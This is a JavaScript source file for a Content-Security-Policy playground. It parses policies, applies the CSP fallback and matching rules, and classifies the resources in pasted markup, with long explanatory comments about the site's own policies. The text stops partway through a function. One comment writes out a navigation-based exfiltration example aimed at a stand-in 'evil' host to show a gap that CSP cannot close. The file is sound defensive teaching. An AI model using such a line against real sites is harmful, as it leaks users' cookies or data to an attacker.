/* ==========================================================================
   csp-playground.js — write a Content-Security-Policy, paste a page, and see
   which requests the browser would refuse.
   --------------------------------------------------------------------------
   A CSP is a header that is easy to write, easy to get subtly wrong, and
   almost impossible to check by reading. The failure mode that matters is not
   "my policy is too strict" — you find that one immediately, because the site
   breaks in front of you. It is the opposite: a policy that looks locked down,
   passes review, and stops nothing. Every trap in this file is one of those.

   So the tool does two things. It parses the policy the way the specification
   says a browser parses it — source lists, the fallback chain to default-src,
   nonces, hashes, scheme and host sources, 'strict-dynamic' — and then it takes
   a page's markup and decides each resource ALLOWED or BLOCKED, naming the
   directive that decided and the exact source expression that matched. A
   verdict with no attribution is just an opinion.

   Two design decisions are worth writing down. First, the markup is parsed
   with DOMParser, whose document has no browsing context: scripts in it do not
   run and images in it are not fetched. That is what makes it safe to paste a
   hostile page in here. Second, the four built-in policies are this site's own,
   copied out of vercel.json when this file was written and frozen here as text.
   They are not fetched at runtime, because this tool makes no network requests
   at all — so if the deployed headers change, this list goes stale until
   somebody updates it by hand. Better a stale honest copy than a request.

   What it is not: it is not a browser. It reads markup, so it sees what the
   page declares, never what a script does after it loads. It has no opinion on
   redirects, which drop path matching in real CSP. And "ALLOWED" here means
   the policy permits the request, not that the request is safe — the JSONP
   warning below exists because those two are routinely confused.
   ========================================================================== */

/* global LabTool */
(function () {
  'use strict';

  var MAX_POLICY = 16 * 1024;
  var MAX_HTML = 512 * 1024;
  var MAX_ROWS = 400;

  var out = LabTool.out('tool-out');

  /* ======================================================================
     The four policies this site actually ships.

     Read out of vercel.json at the time this file was written and inlined as
     data. Each one is the literal header value; the notes are mine.
     ====================================================================== */
  var SITE_POLICIES = [
    {
      path: '/(.*)',
      title: 'Every page on the site',
      extra: 'X-Frame-Options: DENY',
      csp: "default-src 'self'; script-src 'self' 'wasm-unsafe-eval' https://*.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.google-analytics.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.co.in; connect-src 'self' data: https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.co.in; frame-src 'self' blob:; font-src 'self'; media-src 'self' blob:; worker-src 'self' blob:; child-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests",
      notes: [
        'The baseline. default-src \'self\' means every fetch directive I forgot',
        'to name is same-origin only, which is the right way round for a mistake.',
        '',
        'script-src carries no \'unsafe-inline\' and no \'unsafe-eval\'. That is the',
        'reason every lab on this site is a separate .js file and none of them',
        'builds code out of a string. The only inline scripts anywhere here are',
        'application/ld+json blocks, and those are data, not script.',
        '\'wasm-unsafe-eval\' lets the WebAssembly labs compile a module without',
        'handing the whole site eval.',
        '',
        'style-src \'self\' \'unsafe-inline\' is the honest weak spot: several',
        'visualisers set styles from script, so the policy allows inline CSS.',
        '',
        'The last four are the ones default-src does not cover, named on purpose:',
        'object-src \'none\', base-uri \'self\', form-action \'self\' and',
        'frame-ancestors \'none\' — the last paired with X-Frame-Options: DENY.'
      ]
    },
    {
      path: '/(birthday|festival)',
      title: 'The two pages that have to be frameable',
      extra: 'X-Frame-Options: SAMEORIGIN',
      csp: "default-src 'self'; script-src 'self' 'wasm-unsafe-eval' https://*.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.google-analytics.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.co.in; connect-src 'self' data: https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.co.in; frame-src 'self' blob:; font-src 'self'; media-src 'self' blob:; worker-src 'self' blob:; child-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'; upgrade-insecure-requests",
      notes: [
        'Byte for byte the site-wide policy with one word changed:',
        'frame-ancestors \'self\' instead of \'none\', and X-Frame-Options dropped',
        'from DENY to SAMEORIGIN to agree with it.',
        '',
        'These two pages get embedded by other pages on this site. That is the',
        'whole reason for the exception, and it is scoped to two paths rather',
        'than loosened site-wide — which is what a header rule per path is for.'
      ]
    },
    {
      path: '/labs/(.*)',
      title: 'The labs, where a few tools genuinely make requests',
      extra: 'inherits X-Frame-Options: DENY from the site-wide rule',
      csp: "default-src 'self'; script-src 'self' 'wasm-unsafe-eval' https://*.googletagmanager.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.google-analytics.com https://*.googletagmanager.com https://*.g.doubleclick.net https://*.google.com https://*.google.co.in; connect-src 'self' data: https:; frame-src 'self' blob:; font-src 'self'; media-src 'self' blob:; worker-src 'self' blob:; child-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests",
      notes: [
        'The site-wide policy with one directive widened:',
        'connect-src \'self\' data: https:  instead of a named list of origins.',
        '',
        'A handful of labs deliberately talk to the network — DNS over HTTPS,',
        'RDAP, certificate transparency logs — and the origin depends on which',
        'resolver you pick, so the list cannot be enumerated in advance.',
        '',
        'That is a real widening and worth naming as one. bare https: in',
        'connect-src permits any https origin. It buys nothing for an attacker',
        'who cannot already run script here, because script-src is unchanged;',
        'it does mean connect-src has stopped being a second line of defence.',
        'Every lab that uses it says so on the page before it fires.'
      ]
    },
    {
      path: '/labs/hacklab-guestbook',
      title: 'The XSS target — strictest, and the only one allowing inline script',
      extra: 'X-Frame-Options: SAMEORIGIN, X-Robots-Tag: noindex, Cache-Control: no-store',
      csp: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'",
      notes: [
        'This one reads backwards until you know what the page is. It is a',
        'deliberate stored-XSS target: the payload you inject has to run, or the',
        'lesson does not land. So script-src carries \'unsafe-inline\'.',
        '',
        'It is still the strictest policy on the site, because strict is about',
        'what gets out, not what runs:',
        '  connect-src \'none\'   no fetch, no XHR, no WebSocket, no sendBeacon',
        '  form-action \'none\'   the payload cannot POST anywhere',
        '  base-uri  \'none\'     it cannot re-point the page\'s relative URLs',
        '  img-src \'self\' data: no image beacon to another host',
        'The script runs, and has nowhere to send what it finds.',
        '',
        'The limit, said out loud: CSP has no directive that stops a script',
        'navigating the top-level page, so location = \'https://evil/?c=\' + …',
        'is not covered by this or any other policy. navigate-to was proposed',
        'for exactly that and never shipped in any browser.'
      ]
    }
  ];

  /* ======================================================================
     Directives
     ====================================================================== */

  /* The fallback chain, from the CSP Level 3 table. A fetch directive that is
     absent defers to the next name in its list; the first one present decides.
     Everything NOT in this map — base-uri, form-action, frame-ancestors,
     report-uri, sandbox — has no fallback at all, which is the single most
     expensive misunderstanding about default-src. */
  var FALLBACK = {
    'child-src': ['default-src'],
    'connect-src': ['default-src'],
    'default-src': [],
    'fenced-frame-src': ['frame-src', 'child-src', 'default-src'],
    'font-src': ['default-src'],
    'frame-src': ['child-src', 'default-src'],
    'img-src': ['default-src'],
    'manifest-src': ['default-src'],
    'media-src': ['default-src'],
    'object-src': ['default-src'],
    'prefetch-src': ['default-src'],
    'script-src': ['default-src'],
    'script-src-attr': ['script-src', 'default-src'],
    'script-src-elem': ['script-src', 'default-src'],
    'style-src': ['default-src'],
    'style-src-attr': ['style-src', 'default-src'],
    'style-src-elem': ['style-src', 'default-src'],
    'worker-src': ['child-src', 'default-src']
  };

  var NO_FALLBACK = [
    'base-uri', 'block-all-mixed-content', 'form-action', 'frame-ancestors',
    'navigate-to', 'plugin-types', 'referrer', 'report-to', 'report-uri',
    'require-trusted-types-for', 'sandbox', 'trusted-types',
    'upgrade-insecure-requests'
  ];

  /* Directives that take no source list at all. A source list on one of these
     is not an error the browser reports, it is just ignored. */
  var VALUELESS = {
    'upgrade-insecure-requests': 1, 'block-all-mixed-content': 1
  };

  /* These carry a value that is not a source list at all - a URI list, a
     report group name, sandbox tokens, a MIME list. Running source-expression
     validation over them produced a confident and completely wrong
     "/csp-report is not a valid source expression", which is exactly the kind
     of false finding that teaches people to stop reading a tool's output. */
  var NOT_SOURCE_LIST = {
    'report-uri': 1, 'report-to': 1, 'sandbox': 1, 'plugin-types': 1,
    'referrer': 1, 'require-trusted-types-for': 1, 'trusted-types': 1
  };

  var DEPRECATED = {
    'block-all-mixed-content': 'deprecated; upgrade-insecure-requests replaces it',
    'navigate-to': 'was proposed and never shipped — no browser enforces it',
    'plugin-types': 'removed from the spec and from Chrome',
    'prefetch-src': 'removed from the spec; prefetches fall back to default-src',
    'referrer': 'removed; the Referrer-Policy header replaces it',
    'report-uri': 'deprecated in favour of report-to, but still the one browsers support'
  };

  var KNOWN = {};
  (function () {
    var k;
    for (k in FALLBACK) { if (FALLBACK.hasOwnProperty(k)) KNOWN[k] = 1; }
    NO_FALLBACK.forEach(function (n) { KNOWN[n] = 1; });
  })();

  var KEYWORDS = {
    'none': 1, 'self': 1, 'unsafe-inline': 1, 'unsafe-eval': 1,
    'unsafe-hashes': 1, 'wasm-unsafe-eval': 1, 'strict-dynamic': 1,
    'report-sample': 1, 'inline-speculation-rules': 1, 'unsafe-allow-redirects': 1
  };

  var DEFAULT_PORT = { http: '80', https: '443', ws: '80', wss: '443', ftp: '21' };
  var WEB_ALG = { sha256: 'SHA-256', sha384: 'SHA-384', sha512: 'SHA-512' };

  /* ======================================================================
     Small helpers
     ====================================================================== */

  function pad(text, width) {
    var s = String(text);
    return s.length >= width ? s + ' ' : s.padEnd(width, ' ');
  }

  function trim(s) { return String(s).replace(/^\s+|\s+$/g, ''); }

  function nonEmpty(s) { return s.length > 0; }

  /* Nearest known directive name, for "you probably meant object-src". Plain
     Levenshtein over two rolling rows; the names are short, so nothing here is
     worth optimising. */
  function editDistance(a, b) {
    var prev = [], cur = [], i, j;
    for (j = 0; j <= b.length; j++) prev[j] = j;
    for (i = 1; i <= a.length; i++) {
      cur[0] = i;
      for (j = 1; j <= b.length; j++) {
        cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1,
          prev[j - 1] + (a.charAt(i - 1) === b.charAt(j - 1) ? 0 : 1));
      }
      for (j = 0; j <= b.length; j++) prev[j] = cur[j];
    }
    return prev[b.length];
  }

  function nearestDirective(name) {
    var best = null, bestD = 99, k;
    for (k in KNOWN) {
      if (!KNOWN.hasOwnProperty(k)) continue;
      var d = editDistance(name, k);
      if (d < bestD) { bestD = d; best = k; }
    }
    return bestD <= 3 ? best : null;
  }

  /* ======================================================================
     Source expressions
     ====================================================================== */

  function parseHostSource(token) {
    var scheme = null, rest = token, m;
    m = /^([a-zA-Z][a-zA-Z0-9+.\-]*):\/\/(.*)$/.exec(token);
    if (m) { scheme = m[1].toLowerCase(); rest = m[2]; }

    var path = null;
    var slash = rest.indexOf('/');
    if (slash >= 0) { path = rest.slice(slash); rest = rest.slice(0, slash); }

    var port = null;
    var colon = rest.lastIndexOf(':');
    if (colon > 0) {
      var p = rest.slice(colon + 1);
      if (/^(\d+|\*)$/.test(p)) { port = p; rest = rest.slice(0, colon); }
    }

    if (!rest) return null;
    if (rest !== '*' &&
        !/^(\*\.)?[a-zA-Z0-9]([a-zA-Z0-9\-._]*[a-zA-Z0-9])?$/.test(rest)) return null;
    return { scheme: scheme, host: rest.toLowerCase(), port: port, path: path };
  }

  function parseSource(token) {
    var s = { raw: token };
    if (token.charAt(0) === "'" && token.charAt(token.length - 1) === "'" &&
        token.length > 2) {
      var inner = token.slice(1, -1);
      var lower = inner.toLowerCase();
      if (lower.indexOf('nonce-') === 0) {
        s.type = 'nonce';
        // The nonce value is base64 and case-sensitive; only the keyword part
        // may be compared case-insensitively.
        s.value = inner.slice(6);
        return s;
      }
      var h = /^(sha256|sha384|sha512)-(.+)$/i.exec(inner);
      if (h) {
        s.type = 'hash';
        s.alg = h[1].toLowerCase();
        s.value = h[2];
        return s;
      }
      s.type = KEYWORDS[lower] ? 'keyword' : 'bad-keyword';
      s.value = lower;
      return s;
    }
    if (token === '*') { s.type = 'star'; return s; }
    if (/^[a-zA-Z][a-zA-Z0-9+.\-]*:$/.test(token)) {
      s.type = 'scheme';
      s.value = token.slice(0, -1).toLowerCase();
      return s;
    }
    var host = parseHostSource(token);
    if (host) { s.type = 'host'; s.host = host; return s; }
    s.type = 'invalid';
    return s;
  }

  function hasKeyword(sources, name) {
    for (var i = 0; i < sources.length; i++) {
      if (sources[i].type === 'keyword' && sources[i].value === name) return true;
    }
    return false;
  }

  function hasType(sources, type) {
    for (var i = 0; i < sources.length; i++) {
      if (sources[i].type === type) return true;
    }
    return false;
  }

  function isNoneList(sources) {
    return sources.length === 1 && sources[0].type === 'keyword' &&
           sources[0].value === 'none';
  }

  /* ======================================================================
     Policy parsing
     ====================================================================== */

  function parsePolicySet(text) {
    var reportOnly = false;
    var body = String(text).replace(
      /^\s*content-security-policy(-report-only)?\s*:\s*/i,
      function (all, ro) { reportOnly = !!ro; return ''; });

    /* A comma in a CSP header is not a separator inside one policy — it starts
       a SECOND policy, and a resource has to satisfy every policy delivered.
       People type it where they meant a semicolon, so it is worth handling
       properly rather than parsing it as part of a source list. */
    var chunks = body.split(',');
    var policies = [];

    chunks.forEach(function (chunk) {
      if (!trim(chunk)) return;
      var dirs = {}, order = [], dupes = [];
      chunk.split(';').forEach(function (seg) {
        var parts = trim(seg).split(/\s+/).filter(nonEmpty);
        if (!parts.length) return;
        var name = parts[0].toLowerCase();
        var tokens = parts.slice(1);
        if (dirs.hasOwnProperty(name)) {
          // Browsers keep the first occurrence and ignore the rest.
          dupes.push(name);
          return;
        }
        dirs[name] = {
          name: name,
          tokens: tokens,
          sources: tokens.map(parseSource)
        };
        order.push(name);
      });
      policies.push({ dirs: dirs, order: order, dupes: dupes });
    });

    return { policies: policies, reportOnly: reportOnly, split: chunks.length > 1 };
  }

  function effective(policy, wanted) {
    var chain = [wanted].concat(FALLBACK[wanted] || []);
    for (var i = 0; i < chain.length; i++) {
      if (policy.dirs.hasOwnProperty(chain[i])) {
        return { name: chain[i], dir: policy.dirs[chain[i]], chain: chain.slice(0, i + 1) };
      }
    }
    return { name: null, dir: null, chain: chain };
  }

  /* ======================================================================
     URL matching — CSP Level 3, section 6.6.2
     ====================================================================== */

  function parseUrl(ref, base) {
    try {
      var u = base ? new URL(ref, base) : new URL(ref);
      return {
        ok: true,
        href: u.href,
        scheme: String(u.protocol).replace(/:$/, '').toLowerCase(),
        host: String(u.hostname || '').toLowerCase(),
        port: u.port || '',
        path: u.pathname || '',
        search: u.search || ''
      };
    } catch (err) {
      return { ok: false, href: String(ref), scheme: '', host: '', port: '', path: '', search: '' };
    }
  }

  function portOf(u) { return u.port || DEFAULT_PORT[u.scheme] || ''; }

  /* scheme-part matching. Not equality: a policy that says http: also covers
     https:, which is deliberate — nobody should have to downgrade a policy to
     upgrade a site. */
  function schemeMatches(a, b) {
    if (a === b) return true;
    if (a === 'http' && b === 'https') return true;
    if (a === 'ws' && (b === 'wss' || b === 'http' || b === 'https')) return true;
    if (a === 'wss' && b === 'https') return true;
    return false;
  }

  /* '*' covers the network schemes and the document's own scheme, and pointedly
     does NOT cover data:, blob: or filesystem:. img-src * still blocks a data:
     URL image, which surprises people every time. */
  function starMatches(u, self) {
    if (u.scheme === 'http' || u.scheme === 'https' || u.scheme === 'ws' ||
        u.scheme === 'wss' || u.scheme === 'ftp') return true;
    return u.scheme === self.scheme;
  }

  /* 'self' is the document's own origin, and it excludes data:, blob: and
     filesystem: for the same reason '*' does — those URLs have no host to
     compare, so "same origin" is not a question that can be answered. It is
     why this site's own policy has to spell out  data:  and  blob:  in img-src. */
  function selfMatches(u, self) {
    if (u.scheme === 'data' || u.scheme === 'blob' || u.scheme === 'filesystem') return false;
    if (!u.host || u.host !== self.host) return false;
    if (u.scheme === self.scheme) return portOf(u) === portOf(self);
    if (self.scheme === 'http' && (u.scheme === 'https' || u.scheme === 'wss')) {
      return portOf(u) === '443';
    }
    if (self.scheme === 'http' && u.scheme === 'ws') return portOf(u) === '80';
    if (self.scheme === 'https' && u.scheme === 'wss') return portOf(u) === '443';
    return false;
  }

  function hostMatches(hs, u, self) {
    if (hs.scheme) {
      if (!schemeMatches(hs.scheme, u.scheme)) return false;
    } else if (!(u.scheme === self.scheme ||
                 (self.scheme === 'http' && u.scheme === 'https'))) {
      // A host source with no scheme inherits the document's scheme. On an
      // https page, a bare example.com does not match http://example.com.
      return false;
    }
    if (!u.host) return false;

    if (hs.host === '*') {
      // any host
    } else if (hs.host.indexOf('*.') === 0) {
      // *.example.com covers sub.example.com but NOT example.com itself.
      var suffix = hs.host.slice(1);
      if (u.host.length <= suffix.length) return false;
      if (u.host.slice(u.host.length - suffix.length) !== suffix) return false;
    } else if (hs.host !== u.host) {
      return false;
    }

    if (hs.port === '*') {
      // any port
    } else if (hs.port === null) {
      if (portOf(u) !== (DEFAULT_PORT[u.scheme] || '')) return false;
    } else if (hs.port !== portOf(u)) {
      return false;
    }

    if (hs.path && hs.path !== '/') {
      var p = u.path || '/';
      if (hs.path.charAt(hs.path.length - 1) === '/') {
        if (p.indexOf(hs.path) !== 0) return false;
      } else if (p !== hs.path) {
        return false;
      }
    }
    return true;
  }

  function matchUrl(sources, u, self) {
    for (var i = 0; i < sources.length; i++) {
      var s = sources[i];
      if (s.type === 'keyword' && s.value === 'self') {
        if (selfMatches(u, self)) return s;
      } else if (s.type === 'star') {
        if (starMatches(u, self)) return s;
      } else if (s.type === 'scheme') {
        if (schemeMatches(s.value, u.scheme)) return s;
      } else if (s.type === 'host') {
        if (hostMatches(s.host, u, self)) return s;
      }
    }
    return null;
  }

  /* ======================================================================
     Verdicts
     ====================================================================== */

  /* "Nothing covers this" needs two different sentences, and confusing them is
     the exact misunderstanding this whole page is about. A fetch directive that
     is absent but has default-src behind it never reaches here. One that is
     absent with no default-src is unrestricted because the author wrote no
     fallback. base-uri, form-action and frame-ancestors are unrestricted
     because default-src DOES NOT APPLY TO THEM - and the first version of this
     printed "there is no default-src" over a policy that plainly had one,
     which is a falsehood in the one place it matters most. */
  function uncoveredWhy(policy, wanted) {
    if (!FALLBACK[wanted]) {
      return wanted + ' is not in the policy, and default-src does not cover it: ' +
        'it is one of the directives with no fallback at all. Nothing restricts this.';
    }
    if (policy.dirs.hasOwnProperty('default-src')) {
      return 'neither ' + wanted + ' nor any directive it falls back to is in the policy';
    }
    return 'no ' + wanted + ' and no default-src, so nothing restricts this';
  }

  function verdict(allowed, dirName, source, why, extra) {
    var v = { allowed: allowed, dirName: dirName, source: source, why: why };
    if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) v[k] = extra[k]; } }
    return v;
  }

  function checkUrl(policy, wanted, u, self, opts) {
    opts = opts || {};
    var eff = effective(policy, wanted);
    if (!eff.dir) {
      return verdict(true, null, null, uncoveredWhy(policy, wanted));
    }
    var srcs = eff.dir.sources;
    var chainText = eff.chain.join(' → ');

    if (isNoneList(srcs)) {
      return verdict(false, chainText, "'none'", 'the source list is exactly \'none\'');
    }
    if (!srcs.length) {
      return verdict(false, chainText, null,
        'the directive is present with no sources, which matches nothing at all');
    }

    // A nonce on the element authorises the request whatever the URL is. This
    // is the whole point of a nonce, and it is checked before host matching.
    if (opts.nonce) {
      for (var i = 0; i < srcs.length; i++) {
        if (srcs[i].type === 'nonce' && srcs[i].value === opts.nonce) {
          return verdict(true, chainText, srcs[i].raw,
            'the element carries nonce="' + opts.nonce + '" and the directive lists it');
        }
      }
    }

    // A hash source can match an EXTERNAL script or stylesheet too, via its
    // integrity attribute. Rarely used, entirely real.
    if (opts.integrity) {
      var tokens = opts.integrity.split(/\s+/).filter(nonEmpty);
      for (var t = 0; t < tokens.length; t++) {
        for (var j = 0; j < srcs.length; j++) {
          if (srcs[j].type === 'hash' &&
              tokens[t] === srcs[j].alg + '-' + srcs[j].value) {
            return verdict(true, chainText, srcs[j].raw,
              'the integrity attribute carries a hash the directive lists');
          }
        }
      }
    }

    var isScriptDir = eff.name.indexOf('script-src') === 0;
    if (isScriptDir && hasKeyword(srcs, 'strict-dynamic')) {
      return verdict(false, chainText, null,
        "'strict-dynamic' is present, so every host and scheme source in this " +
        'directive is ignored; a script written into the markup needs a matching nonce or hash');
    }

    var m = matchUrl(srcs, u, self);
    if (m) {
      return verdict(true, chainText, m.raw, 'matched by source expression ' + m.raw);
    }
    return verdict(false, chainText, null,
      'no source expression in ' + eff.name + ' matches this URL');
  }

  function checkInline(policy, wanted, opts) {
    opts = opts || {};
    var eff = effective(policy, wanted);
    var isAttr = wanted.indexOf('-attr') > 0;
    if (!eff.dir) {
      return verdict(true, null, null, uncoveredWhy(policy, wanted));
    }
    var srcs = eff.dir.sources;
    var chainText = eff.chain.join(' → ');

    if (isNoneList(srcs)) {
      return verdict(false, chainText, "'none'", 'the source list is exactly \'none\'');
    }
    if (!srcs.length) {
      return verdict(false, chainText, null,
        'the directive is present with no sources, which matches nothing at all');
    }

    var i;
    /* A nonce lives on an element. There is no way to put one on an onclick=
       attribute or a style= attribute, so nonces never authorise those — a
       point people miss when they "nonce everything" and their event handlers
       keep dying. */
    if (!isAttr && opts.nonce) {
      for (i = 0; i < srcs.length; i++) {
        if (srcs[i].type === 'nonce' && srcs[i].value === opts.nonce) {
          return verdict(true, chainText, srcs[i].raw,
            'the element carries nonce="' + opts.nonce + '" and the directive lists it');
        }
      }
    }

    if (opts.hashes) {
      for (i = 0; i < srcs.length; i++) {
        var s = srcs[i];
        if (s.type !== 'hash') continue;
        if (opts.hashes[s.alg] !== s.value) continue;
        if (!isAttr) {
          return verdict(true, chainText, s.raw,
            'the content hashes to a value the directive lists');
        }
        if (hasKeyword(srcs, 'unsafe-hashes')) {
          return verdict(true, chainText, s.raw,
            "the content hashes to a listed value and 'unsafe-hashes' permits " +
            'hashes to apply to attributes');
        }
        return verdict(false, chainText, s.raw,
          'the hash matches, but a hash only covers an event handler or a style ' +
          "attribute when 'unsafe-hashes' is also present");
      }
    }

    var nonceInDir = hasType(srcs, 'nonce');
    var hashInDir = hasType(srcs, 'hash');
    var isScriptDir = eff.name.indexOf('script-src') === 0;
    var strict = isScriptDir && hasKeyword(srcs, 'strict-dynamic');

    if (hasKeyword(srcs, 'unsafe-inline')) {
      /* The headline trap. The spec is explicit: when a source list carries a
         nonce or a hash, 'unsafe-inline' in that same list is ignored outright.
         'strict-dynamic' in a script directive does the same thing. So a
         policy reading  script-src 'unsafe-inline' 'nonce-abc'  is not the
         permissive thing it looks like — and, read the other way, somebody who
         adds a nonce to a policy that already had 'unsafe-inline' has quietly
         made it strict without deleting anything. */
      if (nonceInDir || hashInDir) {
        return verdict(false, chainText, null,
          "'unsafe-inline' is present but IGNORED, because this directive also " +
          'carries ' + (nonceInDir ? 'a nonce' : 'a hash') +
          (nonceInDir && hashInDir ? ' and a hash' : ''));
      }
      if (strict) {
        return verdict(false, chainText, null,
          "'unsafe-inline' is present but IGNORED, because 'strict-dynamic' is " +
          'in the same directive');
      }
      return verdict(true, chainText, "'unsafe-inline'",
        "matched by 'unsafe-inline', which allows every inline block on the page");
    }

    return verdict(false, chainText, null,
      'no matching nonce, no matching hash and no \'unsafe-inline\'');
  }

  /* Several policies can arrive in one header. A request has to satisfy all of
     them, so the first refusal wins and an allow is only an allow if nothing
     objected. */
  function decide(policies, fn) {
    var firstAllow = null;
    for (var i = 0; i < policies.length; i++) {
      var r = fn(policies[i]);
      r.policyIndex = i + 1;
      if (!r.allowed) return r;
      if (!firstAllow) firstAllow = r;
    }
    return firstAllow || verdict(true, null, null, 'no policy was given');
  }

  /* ======================================================================
     Reading the markup
     ====================================================================== */

  var EVENT_ATTRS = ('onabort onanimationend onanimationiteration onanimationstart ' +
    'onauxclick onbeforeinput onbeforeprint onbeforeunload onblur oncancel oncanplay ' +
    'oncanplaythrough onchange onclick onclose oncontextmenu oncopy oncuechange oncut ' +
    'ondblclick ondrag ondragend ondragenter ondragleave ondragover ondragstart ondrop ' +
    'ondurationchange onemptied onended onerror onfocus onformdata onhashchange oninput ' +
    'oninvalid onkeydown onkeypress onkeyup onload onloadeddata onloadedmetadata ' +
    'onloadstart onmessage onmousedown onmouseenter onmouseleave onmousemove onmouseout ' +
    'onmouseover onmouseup onpaste onpause onplay onplaying onpointercancel onpointerdown ' +
    'onpointerenter onpointerleave onpointermove onpointerout onpointerover onpointerup ' +
    'onpopstate onprogress onratechange onreset onresize onscroll onsearch onseeked ' +
    'onseeking onselect onshow onslotchange onstalled onsubmit onsuspend ontimeupdate ' +
    'ontoggle ontransitionend onunload onvolumechange onwaiting onwheel').split(' ');

  var EVENT_SET = {};
  EVENT_ATTRS.forEach(function (n) { EVENT_SET[n] = 1; });

  /* The HTML JavaScript MIME types, plus the two keyword types. A script
     element whose type is none of these is a DATA BLOCK: the browser never
     executes it, and CSP never checks it. That is why the three
     application/ld+json blocks in this very page's <head> survive a policy
     with no 'unsafe-inline' — and why people trying to nonce their structured
     data are solving a problem they do not have. */
  var JS_TYPES = {
    '': 1, 'module': 1, 'importmap': 1, 'speculationrules': 1,
    'application/ecmascript': 1, 'application/javascript': 1,
    'application/x-ecmascript': 1, 'application/x-javascript': 1,
    'text/ecmascript': 1, 'text/javascript': 1, 'text/jscript': 1,
    'text/livescript': 1, 'text/x-ecmascript': 1, 'text/x-javascript': 1
  };

  var PRELOAD_AS = {
    script: 'script-src-elem', style: 'style-src-elem', font: 'font-src',
    image: 'img-src', fetch: 'connect-src', track: 'media-src',
    audio: 'media-src', video: 'media-src', document: 'frame-src',
    worker: 'worker-src', object: 'object-src', embed: 'object-src',
    manifest: 'manifest-src'
  };

  /* Literal URLs a script hands to the network APIs. This is a text scan, not
     a JavaScript parser: a URL built out of a variable is invisible to it, and
     the tool says so in its own output rather than pretending otherwise. */
  var CODE_PATTERNS = [
    { re: /\bfetch\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'connect-src', what: 'a fetch call' },
    { re: /\.open\s*\(\s*(['"])[A-Za-z]+\1\s*,\s*(['"])([^'"\n]+)\2/g, group: 3, dir: 'connect-src', what: 'an XHR .open call' },
    { re: /new\s+WebSocket\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'connect-src', what: 'a WebSocket' },
    { re: /new\s+EventSource\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'connect-src', what: 'an EventSource' },
    { re: /sendBeacon\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'connect-src', what: 'a sendBeacon call' },
    { re: /new\s+Worker\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'worker-src', what: 'a Worker' },
    { re: /\bimport\s*\(\s*(['"])([^'"\n]+)\1/g, group: 2, dir: 'script-src-elem', what: 'a dynamic import' }
  ];

  function scanCode(text, push) {
    CODE_PATTERNS.forEach(function (p) {
      /* These regexes live in a module-level array, so their lastIndex
         survives from one Run to the next. The first evaluation found the
         first network call and every evaluation after it found nothing, which
         looked exactly like a parser bug and was not one. Reset each time. */
      p.re.lastIndex = 0;
      var m;
      while ((m = p.re.exec(text)) !== null) {
        push(p.dir, p.what, m[p.group]);
        if (p.re.lastIndex === m.index) p.re.lastIndex++;
      }
    });
  }

  function fontFaceRanges(css) {
    var ranges = [], m, re = /@font-face\s*\{/gi;
    while ((m = re.exec(css)) !== null) {
      var i = m.index + m[0].length - 1, depth = 0;
      for (; i < css.length; i++) {
        var c = css.charAt(i);
        if (c === '{') depth++;
        else if (c === '}') { depth--; if (depth === 0) break; }
      }
      ranges.push([m.index, i]);
      re.lastIndex = i + 1;
    }
    return ranges;
  }

  function inRanges(index, ranges) {
    for (var i = 0; i < ranges.length; i++) {
      if (index >= ranges[i][0] && index <= ranges[i][1]) return true;
    }
    return false;
  }

  function scanCss(css, push) {
    var ranges = fontFaceRanges(css);
    var re = /url\(\s*(?:'([^']*)'|"([^"]*)"|([^)'"\s]+))\s*\)/g;
    var m;
    while ((m = re.exec(css)) !== null) {
      var u = m[1] || m[2] || m[3];
      if (!u || u.indexOf('#') === 0) continue;
      var isFont = inRanges(m.index, ranges);
      push(isFont ? 'font-src' : 'img-src',
           isFont ? 'CSS @font-face url()' : 'CSS url()', u);
    }
    var imp = /@import\s+(?:url\(\s*)?(?:'([^']*)'|"([^"]*)"|([^)\s;]+))/g;
    while ((m = imp.exec(css)) !== null) {
      var iu = m[1] || m[2] || m[3];
      if (iu) push('style-src-elem', 'CSS @import', iu);
    }
  }

  function srcsetUrls(value) {
    var list = [];
    String(value).split(',').forEach(function (part) {
      var t = trim(part).split(/\s+/)[0];
      if (t) list.push(t);
    });
    return list;
  }

  /* Walk the parsed document in tree order and turn it into a flat list of
     "things this page would ask the network for", each tagged with the
     directive that governs it. */
  function collect(doc, resolveBase) {
    var recs = [];
    var notes = [];

    function url(dir, what, raw, extra) {
      var rec = { dir: dir, what: what, raw: raw, url: parseUrl(raw, resolveBase) };
      if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) rec[k] = extra[k]; } }
      recs.push(rec);
      return rec;
    }
    function inline(dir, what, content, extra) {
      var rec = { dir: dir, what: what, inline: content == null ? '' : content };
      if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) rec[k] = extra[k]; } }
      recs.push(rec);
      return rec;
    }

    var nodes = doc.querySelectorAll('*');
    for (var n = 0; n < nodes.length && recs.length < MAX_ROWS; n++) {
      var el = nodes[n];
      var tag = (el.tagName || '').toLowerCase();

      /* Attributes first, and on every element including <body> — an onload on
         <body> is the oldest inline-handler trick there is. */
      var attrs = el.attributes;
      for (var a = 0; a < attrs.length; a++) {
        var an = attrs[a].name.toLowerCase();
        if (an === 'style') {
          inline('style-src-attr', 'style="" on <' + tag + '>', attrs[a].value);
